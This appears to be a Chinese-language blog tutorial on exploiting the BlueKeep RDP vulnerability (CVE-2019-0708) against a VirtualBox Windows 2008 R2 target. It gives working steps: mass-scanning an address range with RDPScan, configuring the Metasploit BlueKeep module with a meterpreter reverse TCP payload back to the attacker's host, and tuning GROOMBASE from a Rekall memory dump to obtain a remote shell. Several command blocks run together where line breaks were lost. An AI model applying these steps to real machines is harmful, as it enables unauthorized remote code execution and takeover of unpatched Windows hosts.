BlueKeep（CVE-2019-0708）是在Microsoft的远程桌面协议实现中发现的一个安全漏洞。首次报告于2019年5月，它存在于Windows 2000至Windows Server 2008 R2和Windows 7的所有未修补的基于Windows NT的Microsoft Windows版本中。

微软于2019年5月14日发布了一个安全补丁.2019年8月13日，据报道相关的BlueKeep安全漏洞（统称为DejaBlue）会影响Windows的较新版本，包括Windows 7和直至Windows 10的所有最新版本。与旧版Windows一样。

资料来源：Wikipedia.org

攻击解剖

远程桌面协议（RDP）允许在对用户进行身份验证之前，客户端和服务器之间进行大量通信和交互。而这恰恰是BlueKeep在今年夏天初爆发时所利用的。

RDP显示一个远程GUI登录屏幕，用户可以在其中输入其用户名和密码。在该会话的建立过程中，BlueKeep尝试将任意代码写入服务器的内核内存，然后诱使服务器执行该代码。

发起攻击很复杂，但是除了具有远程攻击者可以访问的具有RDP（通常为TCP 3389）的Windows 7或2008 R2系统未打补丁之外，没有其他先决条件。

前提条件

在本文中，我们将看到黑客如何使用BlueKeep远程使易受攻击的Windows计算机崩溃，并最终尝试将远程代码注入其中以执行它。在继续并能够部署此方案之前，您需要在计算机中存在以下各项：

  • VirtualBox 5或6将托管易受攻击的Windows Server。

  • 易受攻击的Windows映像磁盘（您可以在官方下载页面中下载Windows 2008 R2）。

  • 已安装Metasploit的Linux机器（可以是物理机或虚拟机）。

  • RDPScan将用于扫描我们的网络并检测CVE-2019-0708漏洞。

  • Rekall内存取证将用于从RAM转储中提取NPP地址。

使用RDPSCAN查找易受攻击的目标

在Ubuntu / Debian和其他衍生发行版上安装RDPScan

git clone https://github.com/robertdavidgraham/rdpscancdrdpscansudomake

一旦安装了RDPScan，您将需要运行以下命令来扫描网络。

./rdpscan 182.253.0.1-182.253.255.255

或扫描整个子网

./rdpscan 182.253.0.0/24

输出

对于每个扫描的地址，这将产生3个结果之一：

  • 安全-如果目标确定已对机器人进行了修补或至少需要CredSSP / NLA

  • 脆弱-如果目标已被确认为脆弱

  • 未知-如果目标没有响应或发生某些协议故障

如果目标IP地址不存在任何内容，则较旧的版本会显示消息“未知-连接超时”。扫描大型网络时，这会产生过多的关于您不关心的系统的信息。

您可以通过增加工作人员数量来提高扫描大型网络的速度：

rdpscan --workers 10000 182.253.0.0/24
发射攻击

如果您站在这里，我确定您将不耐烦地打开Metasploit控制台来测试此漏洞。我们将使用以下常见选项来首次运行Exploit，以查看受害者计算机上正在发生的情况。

msfconsolemsf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rcemsf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show options[...]msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 192.168.1.105msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set LHOST 192.168.1.102msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set LPORT 4444msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show targets[...]msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set TARGET 2msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit

在上述配置中，受害计算机的名称为192.168.1.105，攻击者计算机的名称为192.168.1.102，我们使用了专门为Windows计算机制作的通用反向TCP有效负载，目前将目标设置为“ 1”。

编辑FDISABLECAM设置

具体而言，这意味着当前仅与CVE-2019-0708关联的Metasploit漏洞利用程序仅在将fDisableCam密钥设置为零且主要问题是注册表项仍使用默认设置的情况下才可以使用。因此，要在目标计算机上进一步移动，必须按照以下屏幕截图打开Registry Editor并将fDisableCam密钥设置为“ 0”。

从目标机器中提取RAM转储

如下面的屏幕快照中所述，要继续前进，我们需要获取正确的GROOMBASE值，该值是NonPagedPool区域（NPP）的起始地址。

，我们将从目标计算机的内存转储中提取NPP地址，这很容易做到，因为我们托管了它。如果使用VirtualBox，则可以快速完成此操作。为此，您首先需要启动目标计算机（VM），一旦准备好使用以下命令，则需要：

VBoxManage debugvm "VM-Name" dumpvmcore --filename=vm.memdump

从RAM转储中获取NPP地址

我们将使用Rekall进行此操作。但是，如果您是司法鉴定专家，则也可以使用Volatility Framework，该方法可以使您执行相同操作。如果您的计算机上尚未安装Rekall，则可以按照以下说明进行操作。有关此工具的更多信息，您可以访问项目的Github页面。

根据来源在Linux上安装/设置Rekall内存取证

sudo apt -y updatepip install virtualenvvirtualenv /tmp/MyEnvsource /tmp/MyEnv/bin/activategit clone https://github.com/google/rekall.git rekallpip3 install --editable rekall/rekall-libpip3 install --editable rekall/rekall-corepip3 install --editable rekall/rekall-agentpip3 install --editable rekall

从Docker安装/设置Rekall内存取证

如果您愿意，可以使用Docker进行工作，则此Dockerfile表示一个封装了Rekall Memory Forensic Framework的Docker映像。要在安装Docker之后运行此映像，请使用如下命令：

sudo mkdir ~/filessudo chmod a+xwr ~/filessudo docker run --rm -u 0 -it -v ~/files:/home/nonroot/files remnux/rekall bash

要使用Rekall的Web控制台，请使用-p参数调用容器，以使主机访问容器的TCP端口8000，如下所示：

sudo docker run --rm -u 0 -it -p 8000:8000 -v ~/files:/home/nonroot/files remnux/rekall

准备好上述Rekall设置选项之一后，只需执行以下命令即可从先前创建的VM内存转储中提取所需的信息。

用法

rekall -f /path/to/your/dump/file.memdump pools

哇！看来我们终于找到了我们想要的东西！突出显示，我们可以看到Rekall从虚拟机的内存转储中提取的NonPagedPool的“开始”地址。现在，我们可以复制此值来编辑Metasploit漏洞的GROOMBASE参数。

设置您的探索

根据所使用的操作系统，Metasploit目录的路径可能与下面描述的示例不同。要找出您的Metasploit的路径，您可以使用以下locate命令。

sudo nano /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb

找到以下行，并用上一步中找到的替换GROOMBASE。

# This works with Virtualbox 6'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)',{ 'Platform' => 'win', 'Arch' => [ARCH_X64],  'GROOMBASE' => 0xfffffa8001804000 }

重要提示：Rekall会在地址字符串的开头删除四个'f'，因此您必须手动添加它才能获得18个字符的长度。完成文件处理后，使用CTRL + x保存文件，然后使用以下命令重新加载所有Metasploit模块。

msf5 > reload_all

你们都做完了！您可以像之前一样重新开始对Metasploit的攻击过程，但是现在我们还将指定GROOMSIZE值。

msfconsolemsf5 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rcemsf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set RHOSTS 192.168.1.105msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set PAYLOAD windows/x64/meterpreter/reverse_tcpmsf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set LHOST 192.168.1.102msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set LPORT 4444msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set TARGET 2msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set GROOMSIZE 200msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > exploit

如您在上面的屏幕截图中所见，创建了一个Meterpreter会话，现在我可以在受害者的计算机上做任何我想做的事情。关于GROOMSIZE，我使用了200MB，因为我的VM正在运行2个处理器，内存为4GB。但是对于在一个proc上运行的具有2GB RAM的普通虚拟机，正确的值可能约为50MB。
